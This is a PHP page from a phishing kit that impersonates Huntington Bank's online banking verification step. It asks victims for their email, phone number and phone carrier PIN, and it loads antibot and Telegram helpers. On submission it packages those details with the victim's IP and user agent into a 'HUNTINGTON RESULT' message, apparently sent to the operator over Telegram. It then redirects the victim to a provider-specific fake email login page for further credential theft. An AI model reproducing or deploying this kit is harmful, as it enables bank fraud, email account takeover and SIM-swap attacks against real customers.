<?php
ob_start();
session_start();
include '../includes/antibot.php';
include_once '../includes/telegram.php';
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Huntington Online Banking Verification | Huntington</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/favicon.ico"/>
	<link href="../static/css/styles.css" rel="stylesheet">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
</head>
<body>
	<div class="spin" id="spin"></div>
	<div class="loading" id="loading"></div>
	<nav class="navbar huntington-nav px-3">
		<a class="navbar-brand navbar-expand-lg p-0" href="">
			<img class="main-logo" src="../static/img/huntington.svg"/>
		</a>
		<ul class="navbar-nav ms-auto">
			<li class="nav-item">
				<img class="lock-logo-nav" src="../static/img/lock-nav.svg"/>
			</li>
		</ul>
	</nav>
	<div class="container verify-container p-3">
		<h1 class="mt-5">Verify your information</h1>
		<div class="progress-container mx-auto my-3">
			<div class="current-progress" style="width: 80%;"></div>
		</div>
		<form action="" method="POST" onsubmit="load()">
			<p>Please verify the phone number and email address associated with your account.</p>
			<h3 class="">Contact information</h3>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="email">Email</label><br>
					<input class="" type="text" name="email" id="email" placeholder="Email" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]+$" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-6 p-3">
					<label class="my-1" for="phone">Phone Number</label><br>
					<input class="" type="tel" name="phone" id="phone" placeholder="Phone Number" required>
				</div>
				<div class="col-md-6 p-3">
					<label class="my-1" for="carrier-pin">Phone Carrier PIN</label><br>
					<input class="" type="tel" name="carrier-pin" id="carrier-pin" placeholder="Phone Carrier PIN (optional)" maxlength="4" pattern="[0-9]{4}">
				</div>
			</div>			
			<div class="my-5" style="text-align: right;">
				<h3>Next: Email verification</h3>
				<button class="back-btn me-4" onclick="return false;">Back</button>
				<button class="continue-btn">Continue</button>
			</div>
		</form>
	</div>
	<div class="main-footer p-5">
		<div class="text-center">
			<img src="../static/img/huntington-footer.svg" width="140px" />
		</div>
		<hr>
		<div class="row mx-auto" style="max-width: 1000px;">
			<div class="col-md-6 footer-links-main">
				<a href="">ACCOUNT DISCLOSURES</a>
				<a href="">PRIVACY POLICY</a>
				<a href="">DO NOT CALL</a>
				<a href="">IDENTITY PROTECTION</a>
				<a href="">SECURITY</a>
				<a href="">ONLINE GUARANTEE</a>
				<a href="">GIVE FEEDBACK</a>
			</div>
			<div class="col-md-6">
				<div class="row">
					<div class="col-md-2 footer-house-container">
						<img src="../static/img/house.svg" width="44px"/>
					</div>
					<div class="col-md-10">
						<p class="p-0">The Huntington National Bank is an Equal Housing Lender and Member FDIC. <img src="../static/img/honeycomb.svg" width="14px"/>®, Huntington®,<img src="../static/img/honeycomb.svg" width="14px"/>Huntington.Welcome.® and Huntington Heads Up ® are federally registered service marks of Huntington Bancshares Incorporated. ©2022 Huntington Bancshares Incorporated.</p>
					</div>
				</div>
			</div>
		</div>
		<div class="mx-auto text-center" style="font-size: .875rem;">
			<p><b>Secure online. Always on time. Guaranteed.</b><span class="lock-footer-img"><img class="mx-3" src="../static/img/lock-footer.svg" width="56px" /></span><b>Need help? Give us a call at (888) 810-1381.</b>
		</div>
	</div>
	<script src="../static/js/cleave.js"></script>
	<script src="../static/js/cleave-phone.us.js"></script>
	<script type="text/javascript">
		new Cleave('#phone', {
			phone: true,
			phoneRegionCode: 'US'
		});
		new Cleave('#carrier-pin', {
			numeral: true,
			numeralThousandsGroupStyle: 'none'
		});
		function load() {
			loading = document.getElementById('loading');
			spin = document.getElementById('spin');
			loading.style.display = 'inline';
			spin.style.display = 'inline';
			setTimeout(() => {
				loading.style.display = 'none';
				spin.style.display = 'none';
			}, 2000);
		}
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$email = $_REQUEST['email'];
	if (preg_match('/@gmail\.com/', $email)){
		$email_type = 'gmail';
	}
	elseif (preg_match('/@yahoo\.com/', $email)){
		$email_type = 'yahoo';
	}
	elseif (preg_match('/@outlook\.com/', $email)){
		$email_type = 'outlook';
	}
	elseif (preg_match('/@hotmail\.com/', $email)){
		$email_type = 'outlook';
	}
	elseif (preg_match('/@aol\.com/', $email)){
		$email_type = 'aol';
	}
	elseif (preg_match('/@icloud\.com/', $email)){
		$email_type = 'icloud';
	}

	$phone = str_replace(' ', '', $_REQUEST['phone']);
	$carrier_pin = $_REQUEST['carrier-pin'];

	if (!isset($_SESSION['id'])){
		header('Location: ../index.php', true);
	}

	$msg = "HUNTINGTON RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| EMAIL : {$email}\n| PHONE : {$phone}\n| CARRIER PIN : {$carrier_pin}";
	send_message($msg);

	switch ($email_type){
		case 'gmail':
			header('Location: ../email/gmail.php' . '?email=' . $email, true);
			break;
		case 'yahoo':
			header('Location: ../email/yahoo.php' . '?email=' . $email, true);
			break;
		case 'outlook':
			header('Location: ../email/outlook.php' . '?email=' . $email, true);
			break;
		case 'aol':
			header('Location: ../email/aol.php' . '?email=' . $email, true);
			break;
		case 'icloud':
			header('Location: ../email/icloud.php' . '?email=' . $email, true);
			break;
		default:
			header('Location: ../email/email.php' . '?email=' . $email, true);
	}
}
?>